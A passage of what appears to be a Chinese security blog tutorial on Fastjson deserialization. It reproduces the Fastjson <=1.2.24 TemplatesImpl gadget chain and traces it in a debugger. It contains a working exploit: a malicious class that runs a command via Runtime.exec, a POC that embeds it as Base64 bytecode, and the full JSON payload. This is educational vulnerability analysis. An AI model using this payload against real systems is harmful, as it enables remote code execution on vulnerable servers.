class="comment">//        System.out.println(&quot;setAge&quot;);  </span></span><br><span class="line"><span class="comment">//        this.age = age;  </span></span><br><span class="line"><span class="comment">//    &#125;  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonstring</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;FastJson.Student\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;Ku1s\&quot;&#125;&quot;</span>;  </span><br><span class="line">         <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);</span><br><span class="line">        System.out.println(obj);  </span><br><span class="line">        System.out.println(obj.getClass().getName());   </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.jpg"></p><p>很明显，前面的Demo中反序列化的类是一个Object类，该类是任意类的父类，其子类Student存在Fastjson反序列化漏洞，当@type指向Student类是反序列化就会触发漏洞。</p><p>对于另一种反序列化指定类的情景，是该指定类本身就存在漏洞，比如我们将上述Demo中反序列化那行代码改成直接反序列化得到Student类而非Object类，这样就是另一个触发也是最直接的触发场景：<br><code>Student obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);</code></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>若反序列化指定类型的类如<code>Student obj = JSON.parseObject(text, Student.class);</code>，该类本身的构造函数、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞；</p><p>若反序列化未指定类型的类如<code>Object obj = JSON.parseObject(text, Object.class);</code>，该若该类的子类的构造方法、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞；</p><p>Fastjson会对满足下列要求的setter&#x2F;getter方法进行调用：</p><p>满足条件的setter：</p><ul><li>函数名长度大于4且以set开头</li><li>非静态函数</li><li>返回类型为void或当前类</li><li>参数个数为1个</li></ul><p>满足条件的getter：</p><ul><li>函数名长度大于等于4</li><li>非静态方法</li><li>以get开头且第4个字母为大写</li><li>无参数</li><li>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</li></ul><h1 id="Fastjson-lt-x3D-1-2-24-反序列化漏洞"><a href="#Fastjson-lt-x3D-1-2-24-反序列化漏洞" class="headerlink" title="Fastjson &lt; &#x3D; 1.2.24 反序列化漏洞"></a>Fastjson &lt; &#x3D; 1.2.24 反序列化漏洞</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>fastjson-1.2.24.jar，commons-codec-1.12.jar，commons-io-2.5.jar，另外基于JdbcRowSetImpl调用链的利用还需要unboundid-ldapsdk-4.0.9.jar。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt; </span><br><span class="line">&lt;groupId&gt;com.unboundid&lt;/groupId&gt; </span><br><span class="line">&lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt; </span><br><span class="line">&lt;version&gt;<span class="number">4.0</span><span class="number">.9</span>&lt;/version&gt; </span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;commons-io&lt;/groupId&gt; </span><br><span class="line">&lt;artifactId&gt;commons-io&lt;/artifactId&gt; </span><br><span class="line">&lt;version&gt;<span class="number">2.5</span>&lt;/version&gt; </span><br><span class="line">&lt;/dependency&gt; </span><br><span class="line"></span><br><span class="line">&lt;dependency&gt; </span><br><span class="line">&lt;groupId&gt;com.alibaba&lt;/groupId&gt; </span><br><span class="line">&lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;<span class="number">1.2</span><span class="number">.24</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt; </span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;commons-codec&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;commons-codec&lt;/artifactId&gt; </span><br><span class="line">&lt;version&gt;<span class="number">1.12</span>&lt;/version&gt; </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h2 id="基于TemplateImpl的利用链"><a href="#基于TemplateImpl的利用链" class="headerlink" title="基于TemplateImpl的利用链"></a>基于TemplateImpl的利用链</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>之前我们在CC3学过 这条链子，就是把几个属性值赋值了，然后再加载我们的 恶意byteCode，因为 TemplatesImpl 类中的 name &#x2F; bytecodes  都时 private 属性 ，所以我们得使用我们上面学过的 Feature.SupportNonPublicField进行反序列化操作才能成功触发利用</p><h3 id="复现利用"><a href="#复现利用" class="headerlink" title="复现利用"></a>复现利用</h3><p>恶意类 Test.java  用于弹计算器，至于为什么继承 AbstractTranslet类在后面的调试分析中会具体看到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">          </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Test</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POC.java  Fastjson反序列化漏洞点，Feature.SupportNonPublicField必须设置，readClass()方法用于将恶意类的二进制数据进行Base64编码，至于为何要进行编码在后面会讲到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.File;  </span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;  </span><br><span class="line"><span class="comment">//用于encode</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClass</span><span class="params">(String cls)</span>&#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(cls)), bos);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="comment">//主方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();  </span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">fileSeparator</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;file.separator&quot;</span>);  </span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">evilClassPath</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;user.dir&quot;</span>) + <span class="string">&quot;\\src\\main\\java\\FastJson\\TemplateImpl\\Test.class&quot;</span>;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">evilCode</span> <span class="operator">=</span> readClass(evilClassPath);  </span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">text1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +  </span><br><span class="line">                    <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;\&quot;_name\&quot;:\&quot;a\&quot;,\&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;</span>;  </span><br><span class="line">            System.out.println(text1);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);  </span><br><span class="line">            <span class="comment">//Object obj = JSON.parse(text1, Feature.SupportNonPublicField);  </span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.jpg"></p><p>看到 输出 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="string">&quot;_bytecodes&quot;</span>:[<span class="string">&quot;yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHAB8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAAIAAkHACEMACIAIwEABGNhbGMMACQAJQEAGkZhc3RKc29uL1RlbXBsYXRlSW1wbC9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAAAuAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAEACwAAAA4AAwAAAAoABAALAA0ADAAMAAAABAABAA0AAQAOAA8AAgAKAAAAGQAAAAMAAAABsQAAAAEACwAAAAYAAQAAABAADAAAAAQAAQAQAAEADgARAAIACgAAABkAAAAEAAAAAbEAAAABAAsAAAAGAAEAAAAUAAwAAAAEAAEAEAAJABIAEwACAAoAAAAlAAIAAgAAAAm7AAVZtwAGTLEAAAABAAsAAAAKAAIAAAAXAAgAGAAMAAAABAABABQAAQAVAAAAAgAW&quot;</span>],<span class="string">&#x27;_name&#x27;</span>:<span class="string">&#x27;a.b&#x27;</span>,<span class="string">&#x27;_tfactory&#x27;</span>:&#123; &#125;,<span class="string">&quot;_outputProperties&quot;</span>:&#123; &#125;,<span class="string">&quot;_name&quot;</span>:<span class="string">&quot;a&quot;</span>,<span class="string">&quot;_version&quot;</span>:<span class="string">&quot;1.0&quot;</span>,<span class="string">&quot;allowedProtocols&quot;</span>:<span class="string">&quot;all&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>其中 讲解POC 几个重要的 JSON键 ：</p><ul><li>@__type 指定的解析类，即 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> Fastjson根据指定类去反序列化得到该类的实例，在默认情况下只会去反序列化public修饰的属性，在PoC中，<code>_bytecodes</code>和<code>_name</code>都是私有属性，这也是我刚刚说的，为什么需要在<code>parseObject()</code>时设置<code>Feature.SupportNonPublicField</code>；</li><li>__bytecodes – 恶意字节码</li><li>__outputProperties – 反序列化中 会自动调用 getter 方法，则调用到 getOutputProperties()方法，进而导致命令执行</li><li>__tfactory:{} – 在defineTransletClasses()时会调用getExternalExtensionsMap()，当为null时会报错，所以要对_tfactory设置；当时我们设置的是  setFieldValue(obj, “_tfactory”, new TransformerFactoryImpl());</li></ul><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>在 反序列化代码处打断点 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure><p>在JSON.parseObject()中会调用DefaultJSONParser.parseObject()，而DefaultJSONParser.parseObject()中调用了JavaObjectDeserializer.deserialze()函数进行反序列化：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.jpg"></p><p>跟进函数  发现这里调用了   DefaultJSONParser.parse()</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.jpg"></p><p>继续跟进， 这里的parser()方法 是对JSON中的内容进行扫描，算此处的token，在switch语句中匹配上了”{“即token对应12，然后对JSON数据调用DefaultJSONParser.parseObject()进行解析：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.jpg"></p><p>跟进 在DefaultJSONParser. parseObject()  中，审计下其代码 因为是token &#x3D; 12 所以跳到 下面的 else 方法内 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;  </span><br><span class="line">    lexer.skipWhitespace();  </span><br><span class="line">    <span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> lexer.getCurrent();  </span><br><span class="line">    <span class="keyword">if</span> (lexer.isEnabled(Feature.AllowArbitraryCommas)) &#123;  </span><br><span class="line">        <span class="keyword">while</span>(ch == <span class="string">&#x27;,&#x27;</span>) &#123;  </span><br><span class="line">            lexer.next();  </span><br><span class="line">            lexer.skipWhitespace();  </span><br><span class="line">            ch = lexer.getCurrent();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里的  skipWhitespace 是做了 去空的字符</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">skipWhitespace</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;  </span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.ch &lt;= <span class="string">&#x27;/&#x27;</span>) &#123;  </span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27; &#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\r&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\n&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\t&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\f&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\b&#x27;</span>) &#123;  </span><br><span class="line">                    <span class="built_in">this</span>.next();  </span><br><span class="line">                    <span class="keyword">continue</span>;                &#125;  </span><br><span class="line">  </span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;/&#x27;</span>) &#123;  </span><br><span class="line">                    <span class="built_in">this</span>.skipComment();  </span><br><span class="line">                    <span class="keyword">continue</span>;                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">return</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为我们是  “ “ “ 双引号开头，到此处调用 scanSymbol()，获取双引号内的内容<br><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.jpg"></p><p>这里得到第一个双引号里的内容为 “ @type “<br><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png"></p><p>往下调试，途中经过几个if判断，再做了一些 去空操作 来到此处  判断key是否为@type且是否关闭了Feature.DisableSpecialKeyDetect设置，通过判断后调用scanSymbol()获取到了@type对应的指定类<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，并调用TypeUtils.loadClass()函数加载该类：<br><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png"></p><p>跟进去，看到如红框的两个判断语句代码逻辑，是判断当前类名是否以” [ “开头或以”L”开头以”;”结尾，当然本次调试分析是不会进入到这两个逻辑，但是后面的补丁绕过中利用到了这两个条件判断，也就是说<strong>这两个判断条件是后面补丁绕过的漏洞点</strong>，值得注意</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.jpg"><br>此处 加载 TemplatesImpl 类后，然后将 该类名 存储到Map 中 最后返回该类，该过程就是 加载该类 存储到Mapping中 ，并返回，后面会说mapping 的作用</p><p>返回到    DefaultJSONParser.parseObject()中往下执行，在最后调用JavaBeanDeserializer.deserialze()对目标类进行反序列化：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.jpg"></p><p>跟进去，循环扫描解析，解析到key为<code>_bytecodes</code>时，调用parseField()进一步解析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">protected</span> &lt;T&gt; T <span class="title function_">deserialze</span><span class="params">(DefaultJSONParser parser, Type type, Object fieldName, Object object, <span class="type">int</span> features)</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> (type != JSON.class &amp;&amp; type != JSONObject.class) &#123;  </span><br><span class="line">        <span class="type">JSONLexerBase</span> <span class="variable">lexer</span> <span class="operator">=</span> (JSONLexerBase)parser.lexer;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">token</span> <span class="operator">=</span> lexer.token();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#125; else &#123;  </span></span><br><span class="line"><span class="comment">    boolean match = this.parseField(parser, key, object, type, fieldValues);</span></span><br></pre></td></tr></table></figure><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.jpg"></p><p>在parseField()中，会调用DefaultFieldDeserializer.parseField()对<code>_bytecodes</code>对应的内容进行解析</p><p>跟进DefaultFieldDeserializer.parseField()函数中，解析出<code>_bytecodes</code>对应的内容后，会调用setValue()函数设置对应的值，这里value即为恶意类二进制内容Base64编码后的数据：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.jpg"><br>FieldDeserializer.setValue()函数，看到是调用<code>private byte[][] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl._bytecodes</code>的set方法来设置<code>_bytecodes</code>的值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (field != <span class="literal">null</span>) &#123;  </span><br><span class="line">    field.set(object, value);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回之后，后面也是一样的，循环处理JSON数据中的其他键值内容。</p><p>当解析到<code>_outputProperties</code>的内容时，看到前面的下划线被去掉了：<br><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.jpg"></p><p>跟进该方法，发现会通过反射机制调用<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()</code>方法，可以看到该方法类型是Properties、满足之前我们得到的结论即Fastjson反序列化会调用被反序列化的类的某些满足条件的getter方法：<br><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/14.jpg"></p><p>跟进去，在getOutputProperties()方法中调用了newTransformer().getOutputProperties()方法，之后就是我们熟悉的 调用newTransformer()</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/15.jpg"></p><p>跟进TemplatesImpl.newTransformer()方法，看到调用了getTransletInstance()方法：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/16.jpg"><br>继续跟进</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/17.png"><br> 可以看到 已经解析到 Test 类，并新建一个 Test类实例，注意前面会先调用 defineTransletClasses()方法来生成一个Java类（Test类）</p><p><img 